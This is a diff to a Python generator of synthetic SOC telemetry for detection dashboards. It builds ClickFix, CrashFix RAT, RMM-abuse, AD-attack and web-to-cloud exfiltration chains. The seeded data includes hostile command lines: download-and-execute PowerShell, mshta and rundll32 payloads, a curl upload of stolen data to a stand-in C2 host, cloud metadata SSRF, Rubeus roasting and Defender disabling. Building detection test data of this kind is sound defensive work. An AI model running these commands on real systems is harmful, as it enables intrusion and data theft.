@@ -57,11 +57,46 @@ WINDOWS_USERS = ["CORP\\admin", "CORP\\analyst", "NT AUTHORITY\\SYSTEM"]
 BASE_TIME = datetime.now(timezone.utc) - timedelta(hours=24)
 ISO_UTC_RE = re.compile(r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d+)?Z$")
 
+WEB_TO_CLOUD_TRACE_ID = "trace_w2c_entry_001"
+WEB_TO_CLOUD_ATTACKER_IP = "185.220.101.1"
+WEB_TO_CLOUD_ATTACKER_UA = "Mozilla/5.0 (compatible; Nuclei - Open-source project)"
+WEB_TO_CLOUD_COMPROMISED_HOST = "app-prod-02"
+WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP = "10.0.1.50"
+WEB_TO_CLOUD_WINDOWS_HOST = "SRV01.sevenkingdoms.local"
+WEB_TO_CLOUD_WINDOWS_PRIVATE_IP = "10.0.1.66"
+WEB_TO_CLOUD_C2_IP = "198.51.100.77"
+WEB_TO_CLOUD_C2_HOST = "updates.cdn-check.example"
+WEB_TO_CLOUD_COMPROMISED_USER = "compromised-svc@corp.example.com"
+WEB_TO_CLOUD_BUCKET = "prod-customer-backups"
+WEB_TO_CLOUD_EXFIL_OBJECT = "customer-export-2026-05.csv"
+WEB_TO_CLOUD_REQUEST_URL = (
+    "/crm/profile/avatar?url=http://169.254.169.254/opc/v2/instance/"
+)
+
+CLICKFIX_TRACE_ID = "trace_clickfix_2026_001"
+CLICKFIX_COMPROMISED_HOST = "WS02.sevenkingdoms.local"
+CLICKFIX_COMPROMISED_PRIVATE_IP = "10.0.2.71"
+CLICKFIX_C2_IP = "203.0.113.200"
+CLICKFIX_C2_HOST = "captcha-verify.example"
+
+TOOL_SHELL_TRACE_ID = "trace_toolshell_sp_001"
+TOOL_SHELL_ATTACKER_IP = "198.51.100.44"
+TOOL_SHELL_HOST = "sharepoint-prod-01"
+TOOL_SHELL_BACKEND = "10.0.4.15"
+
+RMM_TRACE_ID = "trace_rmm_2025_001"
+AITM_TRACE_ID = "trace_aitm_token_2026_001"
+
 
 def ts(offset_minutes=0):
     """Generate ISO8601 timestamp with optional offset."""
     t = BASE_TIME + timedelta(minutes=offset_minutes, seconds=random.randint(0, 59))
     return t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
+
+
+def iso_to_epoch_seconds(value):
+    """Convert a generated UTC ISO8601 timestamp to epoch seconds."""
+    return int(datetime.fromisoformat(value.replace("Z", "+00:00")).timestamp())
 
 
 def windows_guid():
@@ -154,6 +189,8 @@ def oci_audit_event(event_type, user=None, ip=None, status="200",
         event["Status"] = "Success"
     elif str(status).startswith(("4", "5")):
         event["Status"] = "Failure"
+    event["Resource Name"] = resource_name
+    event["Resource ID"] = event.get("data", {}).get("resourceId", "")
     return event
 
 
@@ -710,6 +747,34 @@ def generate_oci_audit_events():
             offset=1320+i
         ))
 
+    # ── 2026 AiTM / token-abuse chain: phishing token replay into cloud APIs ──
+    aitm_actions = [
+        ("com.oraclecloud.consolesignon.login", "code-of-conduct-token-replay"),
+        ("com.oraclecloud.identitycontrolplane.listusers", "token-abuse-list-users"),
+        ("com.oraclecloud.identitycontrolplane.listgroups", "token-abuse-list-groups"),
+        ("com.oraclecloud.objectstorage.listbuckets", "token-abuse-list-buckets"),
+        ("com.oraclecloud.objectstorage.listobjects", "finance-exports"),
+        ("com.oraclecloud.objectstorage.getobject", "finance-exports/payroll-may-2026.csv"),
+        ("com.oraclecloud.identitycontrolplane.createauthtoken", "backup-access-token"),
+    ]
+    for i, (event_type, resource_name) in enumerate(aitm_actions):
+        event = oci_audit_event(
+            event_type,
+            user="codeofconduct-reader@corp.example.com",
+            ip="203.0.113.88",
+            resource_name=resource_name,
+            response_payload={
+                "traceId": AITM_TRACE_ID,
+                "clientApp": "legacy-browser-session",
+                "authContext": "aitm-token-replay",
+            },
+            offset=1330 + i,
+        )
+        event["Trace ID"] = AITM_TRACE_ID
+        event["Attack Stage"] = "aitm_token_abuse"
+        event["Threat Name"] = "AiTM Token Replay"
+        events.append(event)
+
     # ── IAM Rapid Changes (12 IAM events from one user) ──
     rapid_user = "rogue-admin@corp.example.com"
     rapid_iam_events = [
@@ -754,6 +819,52 @@ def generate_oci_audit_events():
             resource_name=name,
             offset=1360+i
         ))
+
+    # ── Web-to-cloud threat hunt: compromised service identity abusing Object Storage ──
+    web_to_cloud_actions = [
+        (
+            "com.oraclecloud.objectstorage.listbuckets",
+            WEB_TO_CLOUD_BUCKET,
+            {"compartmentId": COMPARTMENT_ID, "traceId": WEB_TO_CLOUD_TRACE_ID},
+        ),
+        (
+            "com.oraclecloud.objectstorage.listobjects",
+            f"{WEB_TO_CLOUD_BUCKET}/exports",
+            {"bucketName": WEB_TO_CLOUD_BUCKET, "prefix": "exports/", "traceId": WEB_TO_CLOUD_TRACE_ID},
+        ),
+        (
+            "com.oraclecloud.objectstorage.getobject",
+            f"{WEB_TO_CLOUD_BUCKET}/{WEB_TO_CLOUD_EXFIL_OBJECT}",
+            {
+                "bucketName": WEB_TO_CLOUD_BUCKET,
+                "objectName": WEB_TO_CLOUD_EXFIL_OBJECT,
+                "bytesReturned": 73400320,
+                "traceId": WEB_TO_CLOUD_TRACE_ID,
+            },
+        ),
+        (
+            "com.oraclecloud.objectstorage.createpreauthenticatedrequest",
+            f"{WEB_TO_CLOUD_BUCKET}/{WEB_TO_CLOUD_EXFIL_OBJECT}:read-only-par",
+            {
+                "bucketName": WEB_TO_CLOUD_BUCKET,
+                "objectName": WEB_TO_CLOUD_EXFIL_OBJECT,
+                "accessType": "ObjectRead",
+                "traceId": WEB_TO_CLOUD_TRACE_ID,
+            },
+        ),
+    ]
+    for i, (event_type, resource_name, response_payload) in enumerate(web_to_cloud_actions):
+        event = oci_audit_event(
+            event_type,
+            user=WEB_TO_CLOUD_COMPROMISED_USER,
+            ip=WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP,
+            resource_name=resource_name,
+            response_payload=response_payload,
+            offset=1500 + i,
+        )
+        event["Trace ID"] = WEB_TO_CLOUD_TRACE_ID
+        event["Attack Stage"] = "cloud_data_access"
+        events.append(event)
 
     return events
 
@@ -2025,6 +2136,100 @@ def generate_windows_events():
             offset=690+i,
         ))
 
+    # ── GOAD / Caldera showcase events for dashboard drilldowns ──
+    # Keep these deterministic so the GOAD dashboard can demonstrate AD
+    # discovery, credential access, collection, and sandcat deployment even
+    # without a live Caldera run.
+    goad_host = "kingslanding"
+    goad_user = "SEVENKINGDOMS\\joffrey"
+    goad_cmds = [
+        (
+            1,
+            "C:\\Tools\\AdFind.exe",
+            "AdFind.exe -f \"(objectcategory=person)\" -dn",
+            "C:\\Windows\\System32\\cmd.exe",
+            None,
+            "GOAD AdFind domain account enumeration",
+        ),
+        (
+            1,
+            "C:\\Users\\Public\\SharpHound.exe",
+            "SharpHound.exe -c All --zipfilename kingslanding.zip",
+            "C:\\Windows\\System32\\cmd.exe",
+            None,
+            "GOAD BloodHound collection",
+        ),
+        (
+            1,
+            "C:\\Windows\\System32\\nltest.exe",
+            "nltest.exe /domain_trusts /all_trusts",
+            "C:\\Windows\\System32\\cmd.exe",
+            None,
+            "GOAD domain trust discovery",
+        ),
+        (
+            1,
+            "C:\\Tools\\Rubeus.exe",
+            "Rubeus.exe asreproast /user:svc_sql /format:hashcat /outfile:C:\\Users\\Public\\asrep.txt",
+            "C:\\Windows\\System32\\cmd.exe",
+            None,
+            "GOAD AS-REP roasting with Rubeus",
+        ),
+        (
+            1,
+            "C:\\Program Files\\7-Zip\\7z.exe",
+            "7z.exe a -tzip C:\\Users\\Public\\loot.zip C:\\Shares\\Finance\\* -pWinterIsComing!",
+            "C:\\Windows\\System32\\cmd.exe",
+            None,
+            "GOAD password-protected 7zip collection archive",
+        ),
+        (
+            11,
+            "C:\\Windows\\System32\\cmd.exe",
+            "cmd.exe /c copy C:\\Tools\\sandcat.exe C:\\Users\\Public\\splunkd.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Users\\Public\\splunkd.exe",
+            "GOAD Caldera sandcat staged as splunkd.exe",
+        ),
+        (
+            1,
+            "C:\\Windows\\System32\\schtasks.exe",
+            "schtasks /Create /SC ONCE /TN SplunkFwd /TR C:\\Users\\Public\\splunkd.exe /RU SYSTEM",
+            "C:\\Windows\\System32\\cmd.exe",
+            None,
+            "GOAD Caldera SplunkFwd scheduled task creation",
+        ),
+        (
+            1,
+            "C:\\Users\\Public\\splunkd.exe",
+            "splunkd.exe -server http://192.168.100.78:8888 -group goad",
+            "C:\\Windows\\System32\\schtasks.exe",
+            None,
+            "GOAD Caldera sandcat execution",
+        ),
+        (
+            1,
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true # Caldera pre-stage",
+            "C:\\Windows\\System32\\cmd.exe",
+            None,
+            "GOAD Caldera Defender disable pre-stage",
+        ),
+    ]
+    for i, (event_id, image, cmd, parent, target, message) in enumerate(goad_cmds):
+        events.append(sysmon_event(
+            event_id=event_id,
+            image=image,
+            command_line=cmd,
+            parent_image=parent,
+            target_filename=target,
+            host=goad_host,
+            user=goad_user,
+            msg=message,
+            offset=695+i,
+            Entity=goad_host,
+        ))
+
     # ── Keylogger Indicators (T1056.001) ──
     keylogger_cmds = [
         "powershell.exe Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int vKey);' -Name kb -Namespace k",
@@ -2226,7 +2431,7 @@ def generate_windows_events():
     events.extend(_bluelight_kill_chain_sysmon_events())
 
     # ── Rare processes (Hunt: Windows Rare Processes) ──
-    # The hunting query thresholds executions < 80 across the 14-day window.
+    # The hunting query thresholds executions < 80 across the multi-week window.
     # Emit a handful of unique binaries that appear exactly once each so the
     # rare-process tail of the distribution is non-empty when the dataset is
     # multiplied by ``expand_events_over_days``.
@@ -2244,6 +2449,104 @@ def generate_windows_events():
             parent_image="C:\\Windows\\explorer.exe",
             offset=900 + i,
         ))
+
+    # ── 2025-2026: ClickFix / fake CAPTCHA clipboard execution ──
+    clickfix_processes = [
+        (
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"# ClickFix fake CAPTCHA clipboard verification; iwr https://captcha-verify.example/update.ps1 | iex\"",
+            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+            "initial_access",
+        ),
+        (
+            "C:\\Windows\\System32\\mshta.exe",
+            "mshta.exe https://captcha-verify.example/captcha.hta # ClickFix fake CAPTCHA payload",
+            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+            "execution",
+        ),
+        (
+            "C:\\Windows\\System32\\rundll32.exe",
+            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";GetObject(\"script:https://captcha-verify.example/payload.sct\") # ClickFix",
+            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+            "defense_evasion",
+        ),
+    ]
+    for i, (image, cmd, parent, stage) in enumerate(clickfix_processes):
+        event = sysmon_event(
+            event_id=1,
+            image=image,
+            command_line=cmd,
+            parent_image=parent,
+            host=CLICKFIX_COMPROMISED_HOST,
+            user="CORP\\arya",
+            msg="ClickFix fake CAPTCHA clipboard execution",
+            offset=930 + i,
+        )
+        event["Trace ID"] = CLICKFIX_TRACE_ID
+        event["Attack Stage"] = stage
+        event["Threat Name"] = "ClickFix Clipboard Execution"
+        events.append(event)
+
+    crashfix_processes = [
+        (
+            "C:\\Users\\Public\\Python311\\python.exe",
+            "python.exe C:\\Users\\Public\\CrashFix\\crashfix.py --install-rat --c2 https://crashfix-help.example/api",
+            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+            "payload_execution",
+        ),
+        (
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "powershell.exe -NoProfile -Command \"Invoke-WebRequest https://crashfix-help.example/python-rat.zip -OutFile C:\\Users\\Public\\CrashFix\\rat.zip\"",
+            "C:\\Users\\Public\\Python311\\python.exe",
+            "ingress_tool_transfer",
+        ),
+    ]
+    for i, (image, cmd, parent, stage) in enumerate(crashfix_processes):
+        event = sysmon_event(
+            event_id=1,
+            image=image,
+            command_line=cmd,
+            parent_image=parent,
+            host=CLICKFIX_COMPROMISED_HOST,
+            user="CORP\\arya",
+            msg="CrashFix Python RAT activity following ClickFix social engineering",
+            offset=940 + i,
+        )
+        event["Trace ID"] = CLICKFIX_TRACE_ID
+        event["Attack Stage"] = stage
+        event["Threat Name"] = "CrashFix Python RAT"
+        events.append(event)
+
+    # ── 2025: RMM tool abuse after compromise ──
+    rmm_processes = [
+        (
+            "C:\\Program Files (x86)\\ScreenConnect Client (d4f1)\\ScreenConnect.ClientService.exe",
+            "ScreenConnect.ClientService.exe /silent /reconnect relay.screenconnect.example",
+        ),
+        (
+            "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe",
+            "AnyDesk.exe --start-service --with-password",
+        ),
+        (
+            "C:\\Program Files\\Atera Networks\\AteraAgent.exe",
+            "AteraAgent.exe /install /tenant rmm-sync.atera.example",
+        ),
+    ]
+    for i, (image, cmd) in enumerate(rmm_processes):
+        event = sysmon_event(
+            event_id=1,
+            image=image,
+            command_line=cmd,
+            parent_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            host=CLICKFIX_COMPROMISED_HOST,
+            user="CORP\\arya",
+            msg="Post-compromise RMM tool execution",
+            offset=950 + i,
+        )
+        event["Trace ID"] = RMM_TRACE_ID
+        event["Attack Stage"] = "remote_access"
+        event["Threat Name"] = "RMM Tool Abuse"
+        events.append(event)
 
     return events
 
@@ -2515,7 +2818,165 @@ def winsec_event(event_id, user=None, host=None, source_addr=None,
     event.setdefault("ProcessName", process_name or "")
     event.setdefault("LogonType", str(logon_type) if logon_type else "")
     event.setdefault("SourceAddress", source_addr)
+    event.setdefault("Entity", host)
     return event
+
+
+def _generate_windows_ad_attack_events():
+    """Generate AD security events required by aggregation-heavy widgets."""
+    events = []
+    host = "DC01.sevenkingdoms.local"
+    attacker = "joffrey"
+    service_user = "sql_svc"
+    source_ips = [
+        "10.0.0.5",
+        "10.0.1.10",
+        "172.16.0.50",
+        "192.168.1.100",
+        "185.220.101.1",
+    ]
+
+    # Lateral movement: one account performing network logons from many sources.
+    for i, source_ip in enumerate(source_ips):
+        events.append(winsec_event(
+            4624,
+            user=attacker,
+            host=host,
+            source_addr=source_ip,
+            logon_type=3,
+            msg="An account was successfully logged on. LogonType=3 lateral movement sweep.",
+            offset=820 + i,
+        ))
+
+    # Kerberoasting: many RC4 TGS requests from a single user.
+    service_names = [
+        "MSSQLSvc/db01.sevenkingdoms.local:1433",
+        "HTTP/app01.sevenkingdoms.local",
+        "CIFS/files01.sevenkingdoms.local",
+        "LDAP/dc01.sevenkingdoms.local",
+        "HOST/srv01.sevenkingdoms.local",
+        "WSMAN/srv01.sevenkingdoms.local",
+        "TERMSRV/ws01.sevenkingdoms.local",
+        "HTTP/crm.sevenkingdoms.local",
+        "MSSQLSvc/report01.sevenkingdoms.local:1433",
+        "CIFS/backup01.sevenkingdoms.local",
+        "HTTP/intranet.sevenkingdoms.local",
+        "LDAP/dc02.sevenkingdoms.local",
+    ]
+    for i, service_name in enumerate(service_names):
+        event = winsec_event(
+            4769,
+            user=attacker,
+            host=host,
+            source_addr="10.0.1.10",
+            msg="A Kerberos service ticket was requested with RC4 encryption.",
+            offset=840 + i,
+        )
+        event["Service Name"] = service_name
+        event["Ticket Encryption Type"] = "0x17"
+        event["TicketEncryptionType"] = "0x17"
+        events.append(event)
+
+    # Golden ticket style RC4 TGT requests and renewals.
+    for i, event_id in enumerate([4768, 4770, 4768, 4770]):
+        event = winsec_event(
+            event_id,
+            user=attacker,
+            host=host,
+            source_addr="10.0.1.10",
+            msg="A Kerberos TGT request or renewal used RC4 encryption.",
+            offset=860 + i,
+        )
+        event["Ticket Encryption Type"] = "0x17"
+        event["TicketEncryptionType"] = "0x17"
+        events.append(event)
+
+    # DCSync: directory replication operations from a non-machine account.
+    replication_guids = [
+        "DS-Replication-Get-Changes",
+        "DS-Replication-Get-Changes-All",
+        "DS-Replication-Get-Changes-In-Filtered-Set",
+    ]
+    for i, guid in enumerate(replication_guids * 3):
+        event = winsec_event(
+            4662,
+            user=attacker,
+            host=host,
+            source_addr="10.0.1.10",
+            process_name="C:\\Windows\\System32\\lsass.exe",
+            msg=f"An operation was performed on an object. {guid}",
+            offset=880 + i,
+        )
+        event["Object Name"] = "DC=sevenkingdoms,DC=local"
+        event["Properties"] = guid
+        event["Accesses"] = "Control Access"
+        events.append(event)
+
+    # Pass-the-ticket / explicit credential use.
+    for i in range(8):
+        events.append(winsec_event(
+            4648,
+            user=attacker,
+            host=random.choice(["DC01.sevenkingdoms.local", "SRV01.sevenkingdoms.local"]),
+            source_addr=random.choice(source_ips),
+            process_name="C:\\Windows\\System32\\runas.exe",
+            msg="A logon was attempted using explicit credentials.",
+            offset=900 + i,
+        ))
+
+    # Credential Manager extraction: high-frequency credential reads.
+    for i in range(25):
+        events.append(winsec_event(
+            5379,
+            user=attacker,
+            host="WS01.sevenkingdoms.local",
+            source_addr="10.0.1.10",
+            process_name="C:\\Users\\Public\\lazagne.exe",
+            msg="Credential Manager credentials were read.",
+            offset=920 + i,
+        ))
+
+    # Group enumeration: SharpHound/BloodHound style high-volume group queries.
+    for i in range(60):
+        events.append(winsec_event(
+            4799,
+            user=attacker,
+            host=host,
+            source_addr="10.0.1.10",
+            process_name="C:\\Users\\Public\\SharpHound.exe",
+            msg="A security-enabled local group membership was enumerated.",
+            offset=950 + i,
+        ))
+
+    # Privilege escalation indicator on the same host as the AD chain.
+    event = winsec_event(
+        4672,
+        user=attacker,
+        host=host,
+        source_addr="10.0.1.10",
+        msg="Special privileges assigned to new logon: SeDebugPrivilege SeTcbPrivilege.",
+        offset=1015,
+    )
+    event["Privilege List"] = "SeDebugPrivilege SeTcbPrivilege SeImpersonatePrivilege"
+    event["PrivilegeList"] = "SeDebugPrivilege SeTcbPrivilege SeImpersonatePrivilege"
+    events.append(event)
+
+    # Service-account Kerberos baseline so hunting widgets have another row.
+    for i in range(4):
+        event = winsec_event(
+            4769,
+            user=service_user,
+            host=host,
+            source_addr="10.0.0.5",
+            msg="A Kerberos service ticket was requested.",
+            offset=1020 + i,
+        )
+        event["Service Name"] = f"HTTP/app{i}.sevenkingdoms.local"
+        event["Ticket Encryption Type"] = "0x17"
+        event["TicketEncryptionType"] = "0x17"
+        events.append(event)
+
+    return events
 
 
 def generate_windows_event_security():
@@ -2618,6 +3079,40 @@ def generate_windows_event_security():
             offset=500+i,
         ))
 
+    # 2025-2026 browser social-engineering process creation evidence.
+    clickfix_security_processes = [
+        (
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"# ClickFix fake CAPTCHA clipboard verification; iwr https://captcha-verify.example/update.ps1 | iex\"",
+            "ClickFix fake CAPTCHA process creation",
+        ),
+        (
+            "C:\\Windows\\System32\\mshta.exe",
+            "mshta.exe https://captcha-verify.example/captcha.hta # ClickFix fake CAPTCHA payload",
+            "ClickFix mshta payload execution",
+        ),
+        (
+            "C:\\Users\\Public\\Python311\\python.exe",
+            "python.exe C:\\Users\\Public\\CrashFix\\crashfix.py --install-rat --c2 https://crashfix-help.example/api",
+            "CrashFix Python RAT process creation",
+        ),
+    ]
+    for i, (proc, command_line, msg_text) in enumerate(clickfix_security_processes):
+        event = winsec_event(
+            4688,
+            user="arya",
+            host=CLICKFIX_COMPROMISED_HOST,
+            source_addr=CLICKFIX_COMPROMISED_PRIVATE_IP,
+            process_name=proc,
+            command_line=command_line,
+            msg=msg_text,
+            offset=510 + i,
+        )
+        event["Trace ID"] = CLICKFIX_TRACE_ID
+        event["Attack Stage"] = "execution"
+        event["Threat Name"] = "ClickFix / CrashFix Execution"
+        events.append(event)
+
     bluelight_obfuscated = [
         ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "powershell.exe -NoProfile -Command [Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsA')"),
@@ -2677,6 +3172,8 @@ def generate_windows_event_security():
             msg="An attempt was made to access an object.",
             offset=710+i,
         ))
+
+    events.extend(_generate_windows_ad_attack_events())
 
     return events
 
@@ -3011,6 +3508,37 @@ def generate_linux_secure():
             facility="syslog",
             offset=900+i,
         ))
+
+    web_to_cloud_cmds = [
+        (
+            "curl",
+            "curl -H 'Authorization: Bearer Oracle' http://169.254.169.254/opc/v2/instance/",
+            "metadata_service_access",
+        ),
+        (
+            "bash",
+            f"tar czf /tmp/{WEB_TO_CLOUD_EXFIL_OBJECT}.tgz /var/app/exports/{WEB_TO_CLOUD_EXFIL_OBJECT}",
+            "data_staging",
+        ),
+        (
+            "curl",
+            f"curl -k https://{WEB_TO_CLOUD_C2_HOST}/upload --data-binary @/tmp/{WEB_TO_CLOUD_EXFIL_OBJECT}.tgz",
+            "data_exfiltration",
+        ),
+    ]
+    for i, (process, command, stage) in enumerate(web_to_cloud_cmds):
+        event = linux_secure_event(
+            process,
+            command,
+            host=WEB_TO_CLOUD_COMPROMISED_HOST,
+            user="svc-app",
+            source_ip=WEB_TO_CLOUD_ATTACKER_IP if i == 0 else WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP,
+            facility="syslog",
+            offset=980+i,
+        )
+        event["Trace ID"] = WEB_TO_CLOUD_TRACE_ID
+        event["Attack Stage"] = stage
+        events.append(event)
 
     return events
 
@@ -3525,6 +4053,8 @@ def generate_sysmon_operational():
         "evil-c2.duckdns.org", "beacon.malware.xyz", "update.evil.info",
         "c2.attacker.top", "data.exfil.pw", "dns.tunnel.cc",
         "command.control.tk", "stealer.bad.bit",
+        "a7f3c91d4e8b2a6c0f9d5e1b3a7c9d2.dnsexfil.example",
+        "9f8e7d6c5b4a39281726354433221100.dnsexfil.example",
     ]
     normal_domains = [
         "www.google.com", "login.microsoftonline.com", "api.github.com",
@@ -3702,6 +4232,76 @@ def generate_sysmon_network_events():
                 offset=100 + i * 6 + j,
             ))
 
+    # FreeLabFriday domain-fronting C2 candidates: non-browser processes
+    # repeatedly contacting trusted CDN/cloud endpoints over HTTPS.
+    domain_fronting_targets = [
+        ("d111111abcdef8.cloudfront.net", "13.32.99.20"),
+        ("front-door-prod.azureedge.net", "152.199.19.160"),
+        ("quiet-worker.workers.dev", "104.21.48.10"),
+    ]
+    for i, (cdn_host, cdn_ip) in enumerate(domain_fronting_targets):
+        for j in range(3):
+            events.append(sysmon_network_event(
+                host="WS02.sevenkingdoms.local",
+                user="arya",
+                image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                dst_ip=cdn_ip,
+                dst_port=443,
+                dst_hostname=cdn_host,
+                technique_name="Domain Fronting",
+                technique_id="T1090.004",
+                msg=f"FreeLabFriday domain-fronting candidate: powershell.exe -> {cdn_host}",
+                offset=136 + i * 3 + j,
+            ))
+
+    clickfix_network_targets = [
+        (CLICKFIX_C2_HOST, CLICKFIX_C2_IP, "ClickFix payload retrieval"),
+        ("crashfix-help.example", "203.0.113.201", "CrashFix Python RAT callback"),
+    ]
+    for i, (hostname, dst_ip, label) in enumerate(clickfix_network_targets):
+        for j in range(3):
+            event = sysmon_network_event(
+                host=CLICKFIX_COMPROMISED_HOST,
+                user="CORP\\arya",
+                image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if i == 0 else "C:\\Users\\Public\\Python311\\python.exe",
+                src_ip=CLICKFIX_COMPROMISED_PRIVATE_IP,
+                dst_ip=dst_ip,
+                dst_port=443,
+                dst_hostname=hostname,
+                technique_name="Application Layer Protocol",
+                technique_id="T1071.001",
+                msg=label,
+                offset=150 + i * 4 + j,
+            )
+            event["Trace ID"] = CLICKFIX_TRACE_ID
+            event["Attack Stage"] = "command_and_control"
+            event["Threat Name"] = label
+            events.append(event)
+
+    rmm_network_targets = [
+        ("relay.screenconnect.example", "203.0.113.210", "C:\\Program Files (x86)\\ScreenConnect Client (d4f1)\\ScreenConnect.ClientService.exe"),
+        ("rmm-sync.atera.example", "203.0.113.211", "C:\\Program Files\\Atera Networks\\AteraAgent.exe"),
+    ]
+    for i, (hostname, dst_ip, image) in enumerate(rmm_network_targets):
+        for j in range(4):
+            event = sysmon_network_event(
+                host=CLICKFIX_COMPROMISED_HOST,
+                user="CORP\\arya",
+                image=image,
+                src_ip=CLICKFIX_COMPROMISED_PRIVATE_IP,
+                dst_ip=dst_ip,
+                dst_port=443,
+                dst_hostname=hostname,
+                technique_name="Remote Access Software",
+                technique_id="T1219",
+                msg=f"RMM post-compromise relay: {hostname}",
+                offset=160 + i * 5 + j,
+            )
+            event["Trace ID"] = RMM_TRACE_ID
+            event["Attack Stage"] = "remote_access"
+            event["Threat Name"] = "RMM Tool Abuse"
+            events.append(event)
+
     # BLUELIGHT-style drive-by compromise: iexplore.exe reaching non-Microsoft hosts.
     drive_by_hosts = [
         ("jquery.services", "203.0.113.45"),
@@ -3867,6 +4467,25 @@ def generate_sysmon_network_events():
                 offset=270 + i * 4 + j,
             ))
 
+    # Web-to-cloud drilldown: compromised Windows host beaconing to the same C2.
+    for i in range(4):
+        event = sysmon_network_event(
+            host=WEB_TO_CLOUD_WINDOWS_HOST,
+            user="svc-app",
+            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            src_ip=WEB_TO_CLOUD_WINDOWS_PRIVATE_IP,
+            dst_ip=WEB_TO_CLOUD_C2_IP,
+            dst_port=443,
+            dst_hostname=WEB_TO_CLOUD_C2_HOST,
+            technique_name="Application Layer Protocol",
+            technique_id="T1071.001",
+            msg="Web-to-cloud C2 beacon after app-tier compromise",
+            offset=292 + i,
+        )
+        event["Trace ID"] = WEB_TO_CLOUD_TRACE_ID
+        event["Attack Stage"] = "c2_beacon"
+        events.append(event)
+
     # ── Normal traffic (for contrast) ──
     normal_procs = [
         "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
@@ -3882,6 +4501,471 @@ def generate_sysmon_network_events():
                 msg=f"Normal HTTPS: {proc.split(chr(92))[-1]}",
                 offset=300 + i * 6 + j,
             ))
+
+    return events
+
+
+# ═══════════════════════════════════════════════════════════════════
+#  OCI Network Telemetry (VCN Flow Logs + Network Firewall)
+# ═══════════════════════════════════════════════════════════════════
+
+def vcn_flow_event(src_ip, dst_ip, src_port, dst_port, protocol="6", action="ACCEPT",
+                   bytes_out=0, bytes_in=0, packets_out=1, packets_in=1,
+                   flow_id=None, vnic_id=None, subnet_id=None, trace_id=None,
+                   stage=None, offset=0):
+    """Generate an OCI VCN Flow Log-shaped record with SOC parser aliases."""
+    event_time = ts(offset)
+    start_time = iso_to_epoch_seconds(event_time)
+    end_time = start_time + 60
+    flow_id = flow_id or f"flow-{uuid.uuid4().hex[:16]}"
+    vnic_id = vnic_id or f"ocid1.vnic.oc1..{uuid.uuid4().hex[:32]}"
+    subnet_id = subnet_id or f"ocid1.subnet.oc1..{uuid.uuid4().hex[:32]}"
+    data = {
+        "version": "1",
+        "vcnId": f"ocid1.vcn.oc1..{uuid.uuid4().hex[:32]}",
+        "subnetId": subnet_id,
+        "vnicId": vnic_id,
+        "flowId": flow_id,
+        "flowid": flow_id,
+        "sourceAddress": src_ip,
+        "destinationAddress": dst_ip,
+        "sourcePort": int(src_port),
+        "destinationPort": int(dst_port),
+        "srcaddr": src_ip,
+        "dstaddr": dst_ip,
+        "srcport": int(src_port),
+        "dstport": int(dst_port),
+        "protocol": str(protocol),
+        "action": action,
+        "status": "OK",
+        "startTime": start_time,
+        "endTime": end_time,
+        "bytesOut": int(bytes_out),
+        "bytesIn": int(bytes_in),
+        "packetsOut": int(packets_out),
+        "packetsIn": int(packets_in),
+    }
+    return {
+        "datetime": start_time * 1000,
+        "id": str(uuid.uuid4()),
+        "oracle": {
+            "compartmentid": COMPARTMENT_ID,
+            "ingestedtime": event_time,
+            "loggroupid": "ocid1.loggroup.oc1..socdemo",
+            "logid": "ocid1.log.oc1..vcnflowdemo",
+            "tenantid": "ocid1.tenancy.oc1..example",
+        },
+        "regionId": "us-phoenix-1",
+        "source": "vcn-flow-logs",
+        "specversion": "1.0",
+        "time": event_time,
+        "type": "com.oraclecloud.vcn.flowlogs.DataEvent",
+        "data": data,
+        "Log Source": "SOC VCN Flow Logs",
+        "Trace ID": trace_id or "",
+        "Attack Stage": stage or "",
+        "Source IP": src_ip,
+        "Destination IP": dst_ip,
+        "Source Port": str(src_port),
+        "Destination Port": str(dst_port),
+        "Protocol": str(protocol),
+        "Action": action,
+        "Network Action": action,
+        "Bytes Sent": str(bytes_out),
+        "Bytes Received": str(bytes_in),
+        "Packets": str(int(packets_out) + int(packets_in)),
+        "Flow ID": flow_id,
+        "msg": f"VCN Flow {action}: {src_ip}:{src_port} -> {dst_ip}:{dst_port}",
+    }
+
+
+def generate_vcn_flow_events():
+    """Generate VCN Flow Log records for ingress, C2, lateral movement, and exfil."""
+    events = []
+
+    # Entry request from the internet-facing path into the application subnet.
+    events.append(vcn_flow_event(
+        WEB_TO_CLOUD_ATTACKER_IP,
+        WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP,
+        54321,
+        443,
+        bytes_out=8192,
+        bytes_in=2140,
+        packets_out=18,
+        packets_in=12,
+        flow_id="flow-w2c-entry-001",
+        trace_id=WEB_TO_CLOUD_TRACE_ID,
+        stage="entry_point",
+        offset=126,
+    ))
+
